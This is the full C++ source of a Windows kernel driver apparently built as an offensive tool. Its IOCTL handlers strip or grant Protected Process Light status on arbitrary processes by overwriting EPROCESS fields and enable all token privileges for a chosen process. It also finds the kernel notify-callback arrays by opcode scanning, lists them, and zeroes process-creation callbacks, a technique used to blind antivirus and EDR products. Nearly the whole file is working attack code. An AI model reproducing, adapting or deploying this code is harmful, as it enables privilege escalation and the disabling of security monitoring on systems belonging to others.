#include <ntifs.h>
#include <ntddk.h>
#include <aux_klib.h>

#include "ioctl.h"
#include "Common.h"
#include "Processes.h"

// Prototypes
void DriverCleanup(PDRIVER_OBJECT driver_object);
NTSTATUS CreateClose(_In_ PDEVICE_OBJECT device_object, _In_ PIRP irp);
NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);

WINDOWS_VERSION GetWindowsVersion();
ULONG64 FindPspSetCreateProcessNotify(WINDOWS_VERSION WindowsVersion);
void SearchLoadedModules(CALLBACK_INFORMATION* ModuleInfo);
ULONG64 FindPsSetCreateThreadNotifyRoutine(WINDOWS_VERSION WindowsVersion);
ULONG64 FindPsSetLoadImageNotifyRoutine(WINDOWS_VERSION WindowsVersion);

UNICODE_STRING device_name = RTL_CONSTANT_STRING(L"\\Device\\FirstDriver");
UNICODE_STRING symlink = RTL_CONSTANT_STRING(L"\\??\\FirstDriver");

// Provides C linkage
extern "C"
NTSTATUS
DriverEntry(
	// Pointer to a driver object structure that represents the drivers wdm driver object.
	_In_ const PDRIVER_OBJECT driver_object,
	// A pointer to a UNICODE_STRING structure that specifies the path to the driver's parameters key in the registry.
	_In_ PUNICODE_STRING registry_path)
{
	// Macro to disable warning for unquoted parameters
	UNREFERENCED_PARAMETER(registry_path);

	// When a driver unloads, any resources it's holding must be freed to prevent leaks.
	// A pointer to a "cleanup" function must be provided in the DriverEntry by setting the DriverUnload property of the driver_object.
	driver_object->DriverUnload = DriverCleanup;
	// Dispatch routines.
	// Allow a client to open and close a handle to the driver.
	driver_object->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	driver_object->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;

	// Pointer to device object struct.
	PDEVICE_OBJECT pdevice_object;

	// Create device object and check for failure.
	NTSTATUS status = IoCreateDevice(
		driver_object,
		0,
		&device_name,
		FILE_DEVICE_UNKNOWN,
		0,
		FALSE,
		&pdevice_object
	);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("[!] Failed to create Device object (0x%08X)\n", status);
		return status;
	}

	// Create symlink and check for failure.
	status = IoCreateSymbolicLink(&symlink, &device_name);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[!] Failed to create symlink (0x%08X)\n", status);
		IoDeleteDevice(pdevice_object);
		return status;
	}

	return STATUS_SUCCESS;
}

WINDOWS_VERSION
GetWindowsVersion()
{
	RTL_OSVERSIONINFOW info;
	info.dwOSVersionInfoSize = sizeof(info);

	const NTSTATUS status = RtlGetVersion(&info);

	// Check if version information about running OS can be retrieved
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[!] RtlGetVersion failed (0x%08X)\n", status);
		return WINDOWS_UNSUPPORTED;
	}

	DbgPrint("[+] Windows Version %d.%d\n", info.dwMajorVersion, info.dwBuildNumber);

	if (info.dwMajorVersion != 10)
	{
		return WINDOWS_UNSUPPORTED;
	}

	switch (info.dwBuildNumber)
	{
	case 17763:
		return WINDOWS_REDSTONE_5;

	case 19044:
		return WINDOWS_21H2;

	default:
		return WINDOWS_UNSUPPORTED;
	}
}

NTSTATUS
DeviceControl(
	_In_ PDEVICE_OBJECT DeviceObject,
	_In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS status = STATUS_SUCCESS;
	ULONG_PTR length = 0;

	const WINDOWS_VERSION windows_version = GetWindowsVersion();
	const auto protection_offset = PROCESS_PROTECTION_OFFSET[windows_version - 1];
	const auto process_priv_offset = PROCESS_PRIVILEGE_OFFSET[windows_version - 1];

	// Check for unsupported versions
	if (windows_version == WINDOWS_UNSUPPORTED)
	{
		status = STATUS_NOT_SUPPORTED;
		KdPrint(("[!] Windows Version Unsupported\n"));

		Irp->IoStatus.Status = status;
		Irp->IoStatus.Information = length;

		IoCompleteRequest(Irp, IO_NO_INCREMENT);

		return status;
	}

	// Get pointer to current stack location
	const PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);

	// Switch case for client interaction
	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	case DEVICE_UNPROTECT_PROCESS:
		{
			// Check buffer size
			if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(TargetProcess))
			{
				status = STATUS_BUFFER_TOO_SMALL;
				KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
				break;
			}

			// Try to get input param and check if successful
			const TargetProcess* target = static_cast<TargetProcess*>(stack->Parameters.DeviceIoControl.Type3InputBuffer);
			if (target == nullptr)
			{
				status = STATUS_INVALID_PARAMETER;
				KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
				break;
			}

			// dt nt!_EPROCESS
			// Try to get process from Id and check if successful
			PEPROCESS e_process = NULL;
			status = PsLookupProcessByProcessId(reinterpret_cast<HANDLE>(target->ProcessId), &e_process);
			if (!NT_SUCCESS(status))
			{
				KdPrint(("[!] PsLookupProcessByProcessId failed (0x%08X)\n", status));
				break;
			}
			KdPrint(("[+] Got EPROCESS for PID %d (0x%08p)\n", target->ProcessId, e_process));

			const auto process_protection_info = reinterpret_cast<PROCESS_PROTECTION_INFO*>(reinterpret_cast<ULONG_PTR>(e_process) + protection_offset);
			if (process_protection_info == nullptr)
			{
				status = STATUS_INVALID_PARAMETER;
				KdPrint(("[!] Failed to read PROCESS_PROTECTION_INFO\n"));
				break;
			}
			KdPrint(("[+] Removing Process Protection for PID %d\n", target->ProcessId));

			// Remove protection by setting all levels to 0
			process_protection_info->SignatureLevel = 0;
			process_protection_info->SectionSignatureLevel = 0;
			process_protection_info->Protection.Type = 0;
			process_protection_info->Protection.Signer = 0;

			// dereference eProcess
			ObDereferenceObject(e_process);

			break;
		}
	case DEVICE_PROTECT_PROCESS:
		{
			// Check for right buffer size
			if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(TargetProcess))
			{
				status = STATUS_BUFFER_TOO_SMALL;
				KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
				break;
			}

			// Get input parameter and check if it was provided
			const TargetProcess* target = static_cast<TargetProcess*>(stack->Parameters.DeviceIoControl.Type3InputBuffer);
			if (target == nullptr)
			{
				status = STATUS_INVALID_PARAMETER;
				KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
				break;
			}

			// dt nt!_EPROCESS
			// Try to get process from Id and check if successful
			PEPROCESS e_process = NULL;
			status = PsLookupProcessByProcessId(reinterpret_cast<HANDLE>(target->ProcessId), &e_process);
			if (!NT_SUCCESS(status))
			{
				KdPrint(("[!] PsLookupProcessByProcessId failed (0x%08X)\n", status));
				break;
			}
			KdPrint(("[+] Got EPROCESS for PID %d (0x%08p)\n", target->ProcessId, e_process));

			// Try to get process protection info and check if successful
			const auto process_protection_info = reinterpret_cast<PROCESS_PROTECTION_INFO*>(reinterpret_cast<ULONG_PTR>(e_process) + protection_offset);
			if (process_protection_info == nullptr)
			{
				status = STATUS_INVALID_PARAMETER;
				KdPrint(("[!] Failed to read PROCESS_PROTECTION_INFO\n"));
				ObDereferenceObject(e_process);
				break;
			}
			KdPrint(("[+] Setting Process Protection for PID %d\n", target->ProcessId));

			// Protect process by setting level values
			process_protection_info->SignatureLevel = 30;
			process_protection_info->SectionSignatureLevel = 28;
			process_protection_info->Protection.Type = 2;
			process_protection_info->Protection.Signer = 6;

			// Dereference eProcess
			ObDereferenceObject(e_process);

			break;
		}
	case DEVICE_PROCESS_TOKEN_PRIVILEGE:
		{
			// Check for right buffer size
			if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(TargetProcess))
			{
				status = STATUS_BUFFER_TOO_SMALL;
				KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
				break;
			}

			// Get input parameter and check if it was provided
			const TargetProcess* target = static_cast<TargetProcess*>(stack->Parameters.DeviceIoControl.Type3InputBuffer);
			if (target == nullptr)
			{
				status = STATUS_INVALID_PARAMETER;
				KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
				break;
			}

			// dt nt!_EPROCESS
			// Try to get process from Id and check if successful
			PEPROCESS e_process = NULL;
			status = PsLookupProcessByProcessId(reinterpret_cast<HANDLE>(target->ProcessId), &e_process);
			if (!NT_SUCCESS(status))
			{
				KdPrint(("[!] PsLookupProcessByProcessId failed (0x%08X)\n", status));
				break;
			}
			KdPrint(("[+] Got EPROCESS for PID %d (0x%08p)\n", target->ProcessId, e_process));

			//Try to get token
			PACCESS_TOKEN p_token = PsReferencePrimaryToken(e_process);
			const PPROCESS_PRIVILEGES token_privs = reinterpret_cast<PPROCESS_PRIVILEGES>(reinterpret_cast<ULONG_PTR>(p_token) + process_priv_offset);

			// YEET this shit
			token_privs->Present[0] = token_privs->Enabled[0] = 0xff;
			token_privs->Present[1] = token_privs->Enabled[1] = 0xff;
			token_privs->Present[2] = token_privs->Enabled[2] = 0xff;
			token_privs->Present[3] = token_privs->Enabled[3] = 0xff;
			token_privs->Present[4] = token_privs->Enabled[4] = 0xff;

			// Dereference cause stuff...
			PsDereferencePrimaryToken(p_token);
			ObDereferenceObject(e_process);

			break;
		}
	case ENUM_PROCESS_CALLBACKS:
		{
			constexpr ULONG sz_buffer = sizeof(CALLBACK_INFORMATION) * 64;

			if (stack->Parameters.DeviceIoControl.OutputBufferLength < sz_buffer)
			{
				status = STATUS_BUFFER_TOO_SMALL;
				KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
				break;
			}

			CALLBACK_INFORMATION* user_buffer = static_cast<CALLBACK_INFORMATION*>(Irp->UserBuffer);

			if (user_buffer == nullptr)
			{
				status = STATUS_INVALID_PARAMETER;
				KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
				break;
			}

			const ULONG64 psp_set_create_process_notify = FindPspSetCreateProcessNotify(windows_version);
			if (psp_set_create_process_notify == 0)
			{
				status = STATUS_NOT_FOUND;
				break;
			}

			for (ULONG i = 0; i < 64; i++)
			{
				// 64 bit addresses are 8 bytes
				const ULONG64 p_callback = psp_set_create_process_notify + static_cast<unsigned long long>(i) * 8;
				const auto callback = *reinterpret_cast<PULONG64>(p_callback);

				user_buffer[i].Pointer = callback;

				if (callback > 0)
				{
					SearchLoadedModules(&user_buffer[i]);
				}

				length += sizeof(CALLBACK_INFORMATION);
			}
			break;
		}
	case ENUM_THREAD_CALLBACKS:
		{
			constexpr ULONG sz_buffer = sizeof(CALLBACK_INFORMATION) * 64;

			if (stack->Parameters.DeviceIoControl.OutputBufferLength < sz_buffer)
			{
				status = STATUS_BUFFER_TOO_SMALL;
				KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
				break;
			}

			CALLBACK_INFORMATION* user_buffer = static_cast<CALLBACK_INFORMATION*>(Irp->UserBuffer);

			if (user_buffer == nullptr)
			{
				status = STATUS_INVALID_PARAMETER;
				KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
				break;
			}
			const ULONG64 ps_set_create_thread_notify = FindPsSetCreateThreadNotifyRoutine(windows_version);
			if (ps_set_create_thread_notify == 0)
			{
				status = STATUS_NOT_FOUND;
				break;
			}

			for (ULONG i = 0; i < 64; i++)
			{
				const ULONG64 ps_callback = ps_set_create_thread_notify + static_cast<unsigned long long>(i) * 8;
				const auto ps_ptr_callback = *reinterpret_cast<PULONG64>(ps_callback);
				user_buffer[i].Pointer = ps_ptr_callback;

				if (ps_ptr_callback > 0)
				{
					SearchLoadedModules(&user_buffer[i]);
				}
				length += sizeof(CALLBACK_INFORMATION);
			}
			break;
		}
	case ENUM_LOAD_IMAGE_NOTIFY:
		{
			constexpr ULONG sz_buffer = sizeof(CALLBACK_INFORMATION) * 64;

			if (stack->Parameters.DeviceIoControl.OutputBufferLength < sz_buffer)
			{
				status = STATUS_BUFFER_TOO_SMALL;
				KdPrint(("[!] STATUS_BUFFER_TOO_SMALL\n"));
				break;
			}

			CALLBACK_INFORMATION* user_buffer = static_cast<CALLBACK_INFORMATION*>(Irp->UserBuffer);

			if (user_buffer == nullptr)
			{
				status = STATUS_INVALID_PARAMETER;
				KdPrint(("[!] STATUS_INVALID_PARAMETER\n"));
				break;
			}
			const ULONG64 ps_set_create_thread_notify = FindPsSetLoadImageNotifyRoutine(windows_version);
			if (ps_set_create_thread_notify == 0)
			{
				status = STATUS_NOT_FOUND;
				break;
			}

			for (ULONG i = 0; i < 64; i++)
			{
				const ULONG64 ps_callback = ps_set_create_thread_notify + static_cast<unsigned long long>(i) * 8;
				const auto ps_ptr_callback = *reinterpret_cast<PULONG64>(ps_callback);
				user_buffer[i].Pointer = ps_ptr_callback;

				if (ps_ptr_callback > 0)
				{
					SearchLoadedModules(&user_buffer[i]);
				}
				length += sizeof(CALLBACK_INFORMATION);
			}
			break;
		}
	case ZERO_PROCESS_CALLBACK:
		{
			if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(TargetCallback))
			{
				status = STATUS_BUFFER_TOO_SMALL;
				DbgPrint("[!] STATUS_BUFFER_TOO_SMALL\n");
				break;
			}

			const TargetCallback* target = static_cast<TargetCallback*>(stack->Parameters.DeviceIoControl.Type3InputBuffer);

			if (target == nullptr)
			{
				status = STATUS_INVALID_PARAMETER;
				DbgPrint("[!] STATUS_INVALID_PARAMETER\n");
				break;
			}

			// sanity check value
			if (target->Index < 0 || target->Index > 64)
			{
				status = STATUS_INVALID_PARAMETER;
				DbgPrint("[!] STATUS_INVALID_PARAMETER\n");
				break;
			}

			const ULONG64 psp_set_create_process_notify = FindPspSetCreateProcessNotify(windows_version);

			// iterate over until we hit target index
			for (LONG i = 0; i < 64; i++)
			{
				if (i == target->Index)
				{
					const ULONG64 p_callback = psp_set_create_process_notify + (i * 8);
					*reinterpret_cast<PULONG64>(p_callback) = static_cast<ULONG64>(0);
					break;
				}
			}
			break;
		}

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		KdPrint(("[!] STATUS_INVALID_DEVICE_REQUEST\n"));
		break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = length;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return status;
}

void
SearchLoadedModules(
	CALLBACK_INFORMATION* ModuleInfo)
{
	// Safety measure to not crash VM. Remove in prod
	if (ModuleInfo->Pointer == NULL)
	{
		DbgPrint("Null pointer caught in SearchLoadedModules. Inspect array!\n");
		return;
	}

	NTSTATUS status = AuxKlibInitialize();

	if (!NT_SUCCESS(status))
	{
		KdPrint(("[!] AuxKlibInitialize failed (0x%08X)", status));
		return;
	}

	ULONG sz_buffer = 0;

	// run once to get required buffer size
	status = AuxKlibQueryModuleInformation(
		&sz_buffer,
		sizeof(AUX_MODULE_EXTENDED_INFO),
		NULL);

	if (!NT_SUCCESS(status))
	{
		KdPrint(("[!] AuxKlibQueryModuleInformation failed (0x%08X)", status));
		return;
	}

	// allocate memory
	AUX_MODULE_EXTENDED_INFO* modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePool2(
		POOL_FLAG_PAGED,
		sz_buffer,
		FIRST_DRIVER_TAG);

	if (modules == nullptr)
	{
		status = STATUS_INSUFFICIENT_RESOURCES;
		return;
	}

	// run again to get the info
	status = AuxKlibQueryModuleInformation(
		&sz_buffer,
		sizeof(AUX_MODULE_EXTENDED_INFO),
		modules);

	if (!NT_SUCCESS(status))
	{
		KdPrint(("[!] AuxKlibQueryModuleInformation failed (0x%08X)", status));
		ExFreePoolWithTag(modules, FIRST_DRIVER_TAG);
		return;
	}

	// iterate over each module
	const ULONG number_of_modules = sz_buffer / sizeof(AUX_MODULE_EXTENDED_INFO);
	KdPrint(("Number of modules to scan: %lu\n", number_of_modules));

	for (ULONG i = 0; i < number_of_modules; i++)
	{
		const ULONG64 start_address = reinterpret_cast<ULONG64>(modules[i].BasicInfo.ImageBase);
		const ULONG image_size = modules[i].ImageSize;
		const ULONG64 end_address = start_address + image_size;

		const ULONG64 raw_pointer = *reinterpret_cast<PULONG64>(ModuleInfo->Pointer & 0xfffffffffffffff8);
		if (raw_pointer > start_address && raw_pointer < end_address)
		{
			strcpy(ModuleInfo->ModuleName,
			       reinterpret_cast<CHAR*>(modules[i].FullPathName + modules[i].FileNameOffset));
			break;
		}
	}
	ExFreePoolWithTag(modules, FIRST_DRIVER_TAG);
}

ULONG64
FindPspSetCreateProcessNotify(
	WINDOWS_VERSION WindowsVersion)
{
	UNICODE_STRING unicode_string;
	RtlInitUnicodeString(&unicode_string, L"PsSetCreateProcessNotifyRoutine");

	ULONG64 ps_set_create_process_notify = 0;
	ps_set_create_process_notify = reinterpret_cast<ULONG64>(MmGetSystemRoutineAddress(&unicode_string));
	if (ps_set_create_process_notify == 0)
	{
		KdPrint(("[!] Failed to find PsSetCreateProcessNotifyRoutine\n"));
		return 0;
	}
	KdPrint(("[+] PsSetCreateProcessNotifyRoutine found @ 0x%llX\n", ps_set_create_process_notify));

	ULONG64 psp_set_create_process_notify = 0;
	LONG offset = 0;

	// Search for CALL/JMP
	for (ULONG64 i = ps_set_create_process_notify; i < ps_set_create_process_notify + 20; i++)
	{
		if (*reinterpret_cast<PUCHAR>(i) == PSP_OPCODE[WindowsVersion - 1])
		{
			KdPrint(("[+] CALL/JMP found @ 0x%llX\n", i));
			memcpy(&offset, reinterpret_cast<PUCHAR>(i + 1), 4);
			psp_set_create_process_notify = ps_set_create_process_notify + (i - ps_set_create_process_notify) + offset +
				5;
			break;
		}
	}

	if (psp_set_create_process_notify == 0)
	{
		KdPrint(("[+] Failed to find PspSetCreateProcessNotifyRoutine\n"));
		return 0;
	}
	KdPrint(("[+] PspSetCreateProcessNotifyRoutine found @ 0x%llX\n", psp_set_create_process_notify));

	// Search for LEA
	offset = 0;
	for (ULONG64 i = psp_set_create_process_notify; i < psp_set_create_process_notify + 0xff; i++)
	{
		if (*reinterpret_cast<PUCHAR>(i) == OPCODE_LEA && *reinterpret_cast<PUCHAR>(i + 1) == OPCODE_LEA_R2 && *
			reinterpret_cast<PUCHAR>(i + 2) == OPCODE_LEA_R3)
		{
			KdPrint(("[+] LEA found @ 0x%llX\n", i));
			memcpy(&offset, reinterpret_cast<PUCHAR>(i + 3), 4);

			const ULONG64 p_array = i + offset + 7;
			KdPrint(("[+] PspSetCreateProcessNotifyRoutine array found @ 0x%llX\n", p_array));
			return p_array;
		}
	}

	return 0;
}

ULONG64
FindPsSetCreateThreadNotifyRoutine(
	WINDOWS_VERSION WindowsVersion)
{
	UNICODE_STRING unicode_string;
	RtlInitUnicodeString(&unicode_string, L"PsSetCreateThreadNotifyRoutine");

	const ULONG64 ps_set_create_thread_notify = reinterpret_cast<ULONG64>(MmGetSystemRoutineAddress(&unicode_string));
	if (ps_set_create_thread_notify == 0)
	{
		KdPrint(("[!] Failed to find PsSetCreateThreadNotifyRoutine\n"));
		return 0;
	}

	KdPrint(("[+] PsSetCreateThreadNotifyRoutine found @ 0x%llX\n", ps_set_create_thread_notify));

	ULONG64 psp_set_create_thread_notify = 0;
	LONG offset = 0;

	// Search for CALL/JMP
	for (ULONG64 i = ps_set_create_thread_notify; i < ps_set_create_thread_notify + 20; i++)
	{
		if (*reinterpret_cast<PUCHAR>(i) == PSP_OPCODE[WindowsVersion - 1])
		{
			KdPrint(("[+] CALL/JMP found @ 0x%llX\n", i));
			memcpy(&offset, reinterpret_cast<PUCHAR>(i + 1), 4);
			psp_set_create_thread_notify = ps_set_create_thread_notify + (i - ps_set_create_thread_notify) + offset + 5;
			break;
		}
	}

	if (psp_set_create_thread_notify == 0)
	{
		KdPrint(("[+] Failed to find PspSetCreateThreadNotifyRoutine\n"));
		return 0;
	}

	KdPrint(("[+] PspSetCreateProcessNotifyRoutine found @ 0x%llX\n", psp_set_create_thread_notify));

	// Search for LEA
	offset = 0;
	for (ULONG64 i = psp_set_create_thread_notify; i < psp_set_create_thread_notify + 0xff; i++)
	{
		if (*reinterpret_cast<PUCHAR>(i) == OPCODE_LEA_R1_THREAD_NOTIFY && *reinterpret_cast<PUCHAR>(i + 1) ==
			OPCODE_LEA_R2_THREAD_NOTIFY && *reinterpret_cast<PUCHAR>(i + 2) == OPCODE_LEA_R3_THREAD_NOTIFY)
		{
			KdPrint(("[+] LEA found @ 0x%llX\n", i));
			memcpy(&offset, reinterpret_cast<PUCHAR>(i + 3), 4);

			const ULONG64 p_array = i + offset + 7;
			KdPrint(("[+] PspSetCreateThreadNotifyRoutine array found @ 0x%llX\n", p_array));
			return p_array;
		}
	}
	return 0;
}

ULONG64 FindPsSetLoadImageNotifyRoutine(WINDOWS_VERSION WindowsVersion)
{
	LONG offset_addr = 0;
	ULONG64 ps_set_load_image_notify_routine = 0;
	UNICODE_STRING unicode_string;

	RtlInitUnicodeString(&unicode_string, L"PsSetLoadImageNotifyRoutine");
	ps_set_load_image_notify_routine = reinterpret_cast<ULONG64>(MmGetSystemRoutineAddress(&unicode_string));
	KdPrint(("[+] PsSetLoadImageNotifyRoutine is at address: %llx \n", ps_set_load_image_notify_routine));

	for (ULONG64 i = ps_set_load_image_notify_routine; i < ps_set_load_image_notify_routine + 20; i++)
	{
		if ((*reinterpret_cast<PUCHAR>(i) == PSP_OPCODE[WindowsVersion - 1]))
		{
			offset_addr = 0;
			memcpy(&offset_addr, reinterpret_cast<PUCHAR>(i + 1), 4);
			ps_set_load_image_notify_routine = ps_set_load_image_notify_routine + (i - ps_set_load_image_notify_routine) + offset_addr + 5;
			break;
		}
	}

	KdPrint(("[+] PspLoadImageNotifyRoutine is at address: %llx \n", ps_set_load_image_notify_routine));

	for (ULONG64 i = ps_set_load_image_notify_routine; i < ps_set_load_image_notify_routine + 0xff; i++)
	{
		if (*reinterpret_cast<PUCHAR>(i) == OPCODE_LEA_R1_THREAD_NOTIFY && *reinterpret_cast<PUCHAR>(i + 1) ==
			OPCODE_LEA_R2_THREAD_NOTIFY && *reinterpret_cast<PUCHAR>(i + 2) == OPCODE_LEA_R3_THREAD_NOTIFY)
		{
			offset_addr = 0;
			memcpy(&offset_addr, reinterpret_cast<PUCHAR>(i + 3), 4);
			return offset_addr + 7 + i;
		}
	}
	return 0;
}


NTSTATUS
CreateClose(
	_In_ PDEVICE_OBJECT device_object,
	_In_ const PIRP Irp)
{
	UNREFERENCED_PARAMETER(device_object);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

void
DriverCleanup(
	const PDRIVER_OBJECT driver_object
)
{
	KdPrint(("[+] Driver unloaded\n"));

	IoDeleteSymbolicLink(&symlink);
	IoDeleteDevice(driver_object->DeviceObject);
}
